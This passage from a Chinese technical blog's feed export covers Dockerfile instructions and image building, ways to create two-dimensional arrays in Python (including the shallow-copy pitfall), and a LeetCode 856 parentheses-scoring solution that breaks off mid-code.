<p>　　<code>docker commit</code> 命令是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。 因为，当运行一个容器的时候（如果不使用卷的话） ，所做的任何文件修改都会被记录于容器存储层里。而 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。</p>
<p>　　使用 <code>docker commit</code> 命令虽然可以比较直观的帮助理解镜像分层存储的概念，但是实际环境中并不会这样使用。 因为存在以下问题：</p>
<ul>
<li>在容器中安装软件包、编译构建，会有大量的无关内容被添加进来，如果不小心清理，<code>docker commit</code> 将会导致镜像极为臃肿。 </li>
<li>使用 <code>docker commit</code> 意味着除了制作镜像的人知道执行过什么命令、怎么生成的镜像，别人根本无从得知，这对后续的维护十分不利。</li>
<li>使用 <code>docker commit</code> 制作镜像，以及后期修改的话，每一次修改都会让镜像更加臃肿一次，所删除的上一层的东西并不会丢失，会一直如影随形的跟着这个镜像，即使根本无法访问到。 </li>
</ul>
<p>　　因此，一般不要使用 <code>docker commit</code> 定制镜像，定制镜像应该使用 Dockerfile 来完成。 </p>
<h4 id="基于-Dockerfile-构建镜像"><a href="#基于-Dockerfile-构建镜像" class="headerlink" title="基于 Dockerfile 构建镜像"></a>基于 Dockerfile 构建镜像</h4><p>　　Dockerfile 使用基本的基于 DSL （领域特定语言）语法的指令来构建一个 Docker 镜像，它实际是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。然后，使用<code>docker build</code> 命令基于该 Dockerfile 中的指令构建一个新的镜像。</p>
<h5 id="Dockerfile-指令"><a href="#Dockerfile-指令" class="headerlink" title="Dockerfile 指令"></a>Dockerfile 指令</h5><ul>
<li><strong>FROM 指定基础镜像</strong></li>
</ul>
<p>　　基础镜像是必须指定的。FROM 用于指定基础镜像，因此 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。 </p>
<p>　　可以使用 <code>nginx</code> 、<code>mysql</code> 、<code>python</code> 、<code>golang</code> 等官方镜像作为基础镜像，也可以使用更为基础的操作系统镜像，如 <code>ubuntu</code>、<code>debian</code> 、<code>centos</code> 。除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch 。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p>
<ul>
<li><strong>RUN 执行命令</strong></li>
</ul>
<p>　　<code>RUN</code> 指令是用来执行命令行命令的。 有两种格式：</p>
<ul>
<li><code>shell</code> 格式： <code>RUN &lt;命令&gt;</code> ，就像直接在命令行中输入的命令一样。 </li>
<li><code>exec</code> 格式： <code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code> ，这更像是函数调用中的格式。</li>
</ul>
<p>　　镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。</p>
<ul>
<li><strong>COPY 复制文件</strong></li>
</ul>
<p>　　<code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件/目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。其格式如下：</p>
<ul>
<li><code>COPY &lt;源路径&gt;... &lt;目标路径&gt;</code></li>
<li><code>COPY [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></li>
</ul>
<p>　　<code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符。而 <code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 WORKDIR 指令来指定） 。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。 </p>
<ul>
<li><strong>ADD 更高级的复制文件 </strong></li>
</ul>
<p>　　<code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致，但是，&lt;源路径&gt; 可以是一个 URL  Docker 引擎会试图去下载这个链接的文件放到 &lt;目标路径&gt; 去 。如果 &lt;源路径&gt; 为一个 tar 压缩文件的话，压缩格式为 gzip , bzip2 以及 xz 的情况下， ADD 指令将会自动解压缩这个压缩文件到 &lt;目标路径&gt; 去。 </p>
<p>　　在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code> 。 </p>
<ul>
<li><strong>CMD 容器启动命令</strong></li>
</ul>
<p>　　<code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的。每个 <code>Dockerfile</code> 只有⼀个 <code>CMD</code> 命令， 如果指定了多个 <code>CMD</code> 命令， 那么只有最后⼀条会被执行， 如果启动容器的时候指定了运行的命令， 则会覆盖掉 <code>CMD</code> 指定的命令。</p>
<ul>
<li><code>shell</code> 格式： <code>CMD &lt;命令&gt;</code></li>
<li><code>exec</code> 格式： <code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li>
<li><strong>ENTRYPOINT 入口点</strong></li>
</ul>
<p>　　<code>ENTRYPOINT</code> 的目的和 <code>CMD</code> 一样，都是在指定容器启动程序及参数。 <code>ENTRYPOINT</code> 在运行时也可以替代，不过比 <code>CMD</code> 要略显繁琐，需要通过 <code>docker run</code> 的参数 <code>--entrypoint</code> 来指定。同样，一个 <code>Dockerfile</code> 中只能有一条 <code>ENTRYPOINT</code> 命令，如果多条，则只执行最后一条。另外，<code>ENTRYPOINT</code> 没有 <code>CMD</code> 的可替换特性。</p>
<p>　　当指定了 <code>ENTRYPOINT</code> 后， <code>CMD</code> 的含义就发生了改变，不再是直接的运行其命令，而是将<code>CMD</code> 的内容作为参数传给 <code>ENTRYPOINT</code> 指令，换句话说实际执行时，将变为： <code>&lt;ENTRYPOINT&gt; &quot;&lt;CMD&gt;&quot;</code>。</p>
<ul>
<li><strong>ENV 设置环境变量</strong></li>
</ul>
<p>　　<code>ENV</code> 指令⽤于设置环境变量。也可以在容器启动后，通过 <code>docker inspect</code> 查看这个环境变量，还可以通过在 <code>docker run –env key=value</code> 时设置或修改环境变量。<code>ENV</code> 指令的格式有两种：</p>
<ul>
<li><code>ENV &lt;key&gt; &lt;value&gt;</code></li>
<li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li>
</ul>
<p>　　定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。环境变量可以使用的地方很多，例如 <code>RUN</code> 、<code>COPY</code> 等指令中。</p>
<ul>
<li><strong>ARG 设置构建参数 </strong></li>
</ul>
<p>　　<code>ARG</code> 指令用于设置构建参数， 类似于 <code>ENV</code>。 和 <code>ENV</code> 不同的是， <code>ARG</code> 设置的是构建时的环境变量， 在容<br>器运行时是不会存在这些变量的。格式为：<code>ARG &lt;name&gt;[=&lt;default value&gt;]</code> 。</p>
<ul>
<li><strong>EXPOSE 声明端口 </strong></li>
</ul>
<p>　　<code>EXPOSE</code> 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。 格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code> 。</p>
<p>　　在 <code>Dockerfile</code> 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code> 时，会自动随机映射 <code>EXPOSE</code> 的端口。</p>
<p>　　<code>EXPOSE</code> 和运行时 <code>-p &lt;宿主端口&gt;:&lt;容器端口&gt;</code> 的区别：</p>
<ul>
<li><code>-p</code> 是映射宿主端口和容器端口，也就是将容器的对应端口服务公开给外界访问。</li>
<li><p><code>EXPOSE</code> 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。 </p>
</li>
<li><p><strong>VOLUME 定义匿名卷</strong></p>
</li>
</ul>
<p>　　<code>VOLUME</code> 指令使容器中的⼀个目录具有持久化存储的功能， 该目录可被容器本身使用， 也可共享给其他容器。 即，可实现挂载功能，可以将本地文件夹或者其他容器中的文件夹挂在到这个容器中。当容器中的应用有持久化数据的需求时可以在 <code>Dockerfile</code> 中使用该指令。其格式为：</p>
<ul>
<li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li>
<li><p><code>VOLUME &lt;路径&gt;</code></p>
</li>
<li><p><strong>ONBUILD 为他人做嫁衣</strong></p>
</li>
</ul>
<p>　　<code>ONBUILD</code> 是一个特殊的指令，它后面跟的是其它指令，比如 <code>RUN</code> , <code>COPY</code> 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。格式：<code>ONBUILD &lt;其它指令&gt;</code>。 </p>
<ul>
<li><strong>WORKDIR 指定工作目录</strong></li>
</ul>
<p>　　使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录） ，以后各层的当前目录就被改为指定的目录，如该目录不存在， <code>WORKDIR</code> 会帮你建立目录。 格式为 <code>WORKDIR &lt;工作目录路径&gt;</code> 。 </p>
<p>　　实际上就是切换目录指令， 类似于 <code>cd</code> 命令， 写在该指令后的 <code>RUN</code> ，<code>CMD</code> 以及 <code>ENTRYPOINT</code> 指令都将该目录作为当前目录， 并执行相应的命令。 </p>
<ul>
<li><strong>USER 指定当前用户 </strong></li>
</ul>
<p>　　<code>USER</code> 指令用于设置启动镜像时的用户或者 <code>UID</code>， 写在该指令后的 <code>RUN</code>、<code>CMD</code> 以及 <code>ENTRYPOINT</code> 指令都将使用该用户执行命令。 格式：<code>USER &lt;用户名&gt;</code> 。</p>
<p>　　<code>USER</code> 指令和 <code>WORKDIR</code> 相似，都是改变环境状态并影响以后的层。 <code>WORKDIR</code> 是改变工作目录， <code>USER</code> 则是改变之后层的执行 <code>RUN</code> , <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。 </p>
<ul>
<li><strong>LABEL 为镜像添加元数据 </strong></li>
</ul>
<p>　　<code>LABEL</code> 指令用于为镜像添加元数据。格式为：<code>LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</code> 。⽤于指定维护者信息的 <code>MAINTAINER</code> 指令已经过时，可使用 <code>LABEL maintainer=&quot;xxx@xxx.com&quot;</code> 替代。</p>
<h5 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h5><p>　　<code>docker build</code> 和 <code>docker image build</code> 命令使用 Dockerfile 创建镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image build [OPTIONS] PATH | URL | -</span></div></pre></td></tr></table></figure>
<p>　　或：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker build [OPTIONS] PATH | URL | -</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--tag, -t</code> ：设置标签，格式： <code>name:tag</code>， tag 可选；</li>
<li>选项 <code>--no-cache</code> ：创建镜像的过程不使用缓存；</li>
<li>选项 <code>--add-host</code> ：添加自定义从 host 到 IP 的映射， 格式为：<code>host:ip</code>；</li>
<li>选项 <code>--build-arg</code> ：设置构建时的变量；</li>
<li>选项 <code>--cache-from</code> ： 作为缓存源的镜像；</li>
<li>……具体选项可查看官方文档，这里不详细介绍。</li>
</ul>
<p>　　<strong>PATH|URL</strong>： 指定构建镜像的上下文的路径，构建镜像的过程中，可以且只可以引用上下文中的任何文件。</p>
<p>　　<code>docker build</code> 支持从从 URL 构建，例如从 Git 仓库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker build git仓库地址</span></div></pre></td></tr></table></figure>
<p>　　如果所给出的 URL 不是个 Git 仓库，而是个  tar  压缩包，那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。用给定的 tar 压缩包构建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ docker build - &lt; context.tar.gz</div></pre></td></tr></table></figure>
<p>　　也可以使用当前目录的 Dockerfile 创建镜像，或者通过 -f Dockerfile 文件的位置。还支持从标准输入中读取 Dockerfile 进行构建。</p>
<p>　　示例，创建 Dockerfile 文件，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><div class="line"><span class="keyword">FROM</span> nginx</div><div class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span></div></pre></td></tr></table></figure>
<p>　　构建镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker build -t mynginx .</div><div class="line">Sending build context to Docker daemon  2.048kB</div><div class="line">Step 1/2 : FROM nginx</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> f09fe80eb0e7</span></div><div class="line">Step 2/2 : RUN echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 403fbe9c02bf</span></div><div class="line">Removing intermediate container 403fbe9c02bf</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> b3074b079926</span></div><div class="line">Successfully built b3074b079926</div><div class="line">Successfully tagged mynginx:latest</div></pre></td></tr></table></figure>
<p>　　在这条命令中，使用 <code>-t</code> 指定了镜像名为 mynginx，由于没有使用 <code>-f</code> 指令，所以默认使用上下文路径下名为 Dockerfile 的文件认为是构建镜像的”Dockerfile”。最后指定上下文路径，在这条命令中，上下文路径是 <code>.</code> 。</p>
<h4 id="精简镜像体积"><a href="#精简镜像体积" class="headerlink" title="精简镜像体积"></a>精简镜像体积</h4><h5 id="选择最精简的基础镜像"><a href="#选择最精简的基础镜像" class="headerlink" title="选择最精简的基础镜像"></a>选择最精简的基础镜像</h5><p>　　选择体积最小的基础镜像可有效降低镜像体积。如：<code>alpine</code>、<code>busybox</code> 等。</p>
<h5 id="清理镜像构建的中间产物"><a href="#清理镜像构建的中间产物" class="headerlink" title="清理镜像构建的中间产物"></a>清理镜像构建的中间产物</h5><p>　　构建镜像的过程中，当 Dockerfile 的指令执行完成后，删除镜像不需要用的的文件。<code>apt-get autoremove</code> 和 <code>apt-get clean all</code> 把所有不必要的依赖全删，或者使用系统 rm 命令删除不需要的源文件。</p>
<h5 id="减少镜像的层数"><a href="#减少镜像的层数" class="headerlink" title="减少镜像的层数"></a>减少镜像的层数</h5><p>　　镜像是一个分层存储的文件，并且镜像对层数也是有一定数量的限制，当前镜像的层数最高是127层，如果不多加注意，将会导致镜像越来越臃肿。在使用 Dockerfile 构建镜像时，每一条指令都会生成一个层，因此可以通过串联 Dockerfile 指令，例如RUN 指令通过 <code>&amp;&amp;</code> 和 <code>/</code> 支持将命令串联在一起，减少最终生成镜像的层数。</p>
<h5 id="多阶段构建"><a href="#多阶段构建" class="headerlink" title="多阶段构建"></a>多阶段构建</h5><p>　　Docker 多阶段构建是 17.05 以后引入的新特性，旨在解决编译和构建复杂的问题，减小镜像大小。对于多阶段构建，在 Dockerfile 中使用多个<code>FROM</code> 语句。每个 <code>FROM</code> 指令可以使用不同的基础，并且每个指令都开始一个新的构建。您可以选择性地将工件从一个阶段复制到另一个阶段，从而在最终镜像中只留下您想要的内容（这里只做简单描述，后续再详细分析 Docker 的多阶段构建）。 </p>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 二维数组</title>
    <url>/2019/02/04/Python-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<center>Python 二维数组学习。</center>

<a id="more"></a>
<h5 id="直接创建法"><a href="#直接创建法" class="headerlink" title="直接创建法"></a>直接创建法</h5><p>　　简单粗暴，不过太麻烦，一般不用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">num = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]]</div></pre></td></tr></table></figure>
<h5 id="列表生成式法"><a href="#列表生成式法" class="headerlink" title="列表生成式法"></a>列表生成式法</h5><p>　　列表生成式即 List Comprehensions，是 Python 内置的非常简单却强大的可以用来创建list的生成式。</p>
<p>　　举例，range 函数生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">1</span>, <span class="number">11</span>)</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</div></pre></td></tr></table></figure>
<p>　　如果要生成 <code>[1x1, 2x2, 3x3, ..., 10x10]</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure>
<p>　　相当于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</div><div class="line"><span class="meta">... </span>   L.append(x * x)</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure>
<p>　　还可以在后面加上判断来筛选出仅偶数的平方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</div><div class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure>
<p>　　也可以使用两层循环，可以生成全排列：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</div><div class="line">[<span class="string">'AX'</span>, <span class="string">'AY'</span>, <span class="string">'AZ'</span>, <span class="string">'BX'</span>, <span class="string">'BY'</span>, <span class="string">'BZ'</span>, <span class="string">'CX'</span>, <span class="string">'CY'</span>, <span class="string">'CZ'</span>]</div></pre></td></tr></table></figure>
<p>　　当然，最重要的是这里要讲的使用列表生成式来生成二维数组，例如生成 3 行 2 列的 0 数组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>)]</div><div class="line">[[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>]]</div></pre></td></tr></table></figure>
<p>　　相当于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line"><span class="meta">... </span>    row = []</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</div><div class="line"><span class="meta">... </span>        row.append(<span class="number">0</span>)</div><div class="line"><span class="meta">... </span>    L.append(row)</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L</div><div class="line">[[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>]]</div></pre></td></tr></table></figure>
<h5 id="错误的创建方法"><a href="#错误的创建方法" class="headerlink" title="错误的创建方法"></a>错误的创建方法</h5><p>　　<code>list * n</code> 的意思是 <code>n</code> 个 列表的<strong>浅拷贝</strong>的连接。例如，<code>[[]]</code> 是一个含有一个空列表元素的列表，所以 <code>[[]]*3</code> 表示 3 个指向这个空列表元素的引用，修改任何一个元素都会改变整个列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [[]]*<span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L</div><div class="line">[[], [], []]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">0</span>].append(<span class="number">1</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L</div><div class="line">[[<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">1</span>]]</div></pre></td></tr></table></figure>
<p>　　再例如，一维数组使用 <code>*</code> 是没有问题的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>num = [[<span class="number">0</span>]*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(num)</div><div class="line">[[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>num[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(num)	<span class="comment"># 只改变了num[0][0]的值</span></div><div class="line">[[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>]]</div></pre></td></tr></table></figure>
<p>　　但是，<strong>在创建二维数组时就需要特别注意，因为列表在 Python 中是可变对象，外部的 <code>*</code> 相当于浅拷贝二维数组的中的一维列表，因此，改变其中任意一个值，其他的浅拷贝都会被改变</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>num = [[<span class="number">0</span>]*<span class="number">2</span>]*<span class="number">2</span>	<span class="comment"># 第二个 * 是浅拷贝</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(num)</div><div class="line">[[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>num[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(num)	<span class="comment"># num[0][0]和num[1][0]的值都被改变了</span></div><div class="line">[[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>]]</div></pre></td></tr></table></figure>
<h5 id="numpy-创建"><a href="#numpy-创建" class="headerlink" title="numpy 创建"></a>numpy 创建</h5><p>　　numpy 模块支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]], dtype=int)  <span class="comment"># 创建2*3维数组</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L</div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.shape</div><div class="line">(<span class="number">2</span>, <span class="number">3</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.size</div><div class="line"><span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.itemsize</div><div class="line"><span class="number">4</span></div></pre></td></tr></table></figure>
<p>　　利用特殊方法生成特殊的数组，例如生成 3 行 2 列的二维全 0 数组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.zeros((<span class="number">3</span>, <span class="number">2</span>), dtype=int)</div><div class="line">array([[<span class="number">0</span>, <span class="number">0</span>],</div><div class="line">       [<span class="number">0</span>, <span class="number">0</span>],</div><div class="line">       [<span class="number">0</span>, <span class="number">0</span>]])</div></pre></td></tr></table></figure>
<p>　　生成 3 行 2 列的二维全 1 数组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones((<span class="number">3</span>, <span class="number">2</span>), dtype=int)</div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>]])</div></pre></td></tr></table></figure>
<p>　　numpy 模块的功能十分强大，其他方法的使用可以查找其官方文档进行学习。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Array</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 856. Score of Parentheses</title>
    <url>/2019/02/03/LeetCode-856-Score-of-Parentheses/</url>
    <content><![CDATA[<center>LeetCode 856. Score of Parentheses 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong></li>
</ul>
<p>Given a balanced parentheses string <code>S</code>, compute the score of the string based on the following rule:</p>
<ul>
<li><code>()</code> has score 1</li>
<li><code>AB</code> has score <code>A + B</code>, where A and B are balanced parentheses strings.</li>
<li><code>(A)</code> has score <code>2 * A</code>, where A is a balanced parentheses string.</li>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个平衡括号字符串 <code>S</code>，按下述规则计算该字符串的分数：</p>
<ul>
<li><code>()</code> 得 1 分。</li>
<li><code>AB</code> 得 <code>A + B</code> 分，其中 A 和 B 是平衡括号字符串。</li>
<li><code>(A)</code> 得 <code>2 * A</code> 分，其中 A 是平衡括号字符串。</li>
</ul>
<p><strong>提示：</strong></p>
<ol>
<li><code>S</code> 是平衡括号字符串，且只含有 <code>(</code> 和 <code>)</code> 。</li>
<li><code>2 &lt;= S.length &lt;= 50</code></li>
</ol>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入： &quot;()&quot;</div><div class="line">输出： 1</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入： &quot;(())&quot;</div><div class="line">输出： 2</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 3：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入： &quot;()()&quot;</div><div class="line">输出： 2</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 4：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入： &quot;(()(()))&quot;</div><div class="line">输出： 6</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　利用栈解题，当遇到左半边括号时压进 -1 ，遇到右半边括号时，判断栈顶是否是 -1，如果不是则把栈顶的分数出栈，记录到结果 score 中。 如果栈顶是 -1 ，则判断 score 是否为 0，如果是，则证明是 () 这种情况，压入分数1。否则，压入 2 倍 score。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">scoreOfParentheses</span><span class="params">(self, S)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type S: str</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        stack = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> S:</div><div class="line">            <span class="keyword">if</span> i == <span class="string">'('</span>:  <span class="comment"># "("入栈</span></div><div class="line">                stack.append(<span class="number">-1</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                score = <span class="number">0</span></div><div class="line">                <span class="keyword">while</span> stack[<span class="number">-1</span>] != <span class="number">-1</span>:  <span class="comment"># 计分</span></div><div class="line">                    score += stack.pop()</div><div class="line">                stack.pop()</div><div class="line">                <span class="keyword">if</span> score == <span class="number">0</span>:  <span class="comment"># "()"的情况</span></div><div class="line">                    stack.append(<span class="number">1</span>)</div><div class="line">                <span 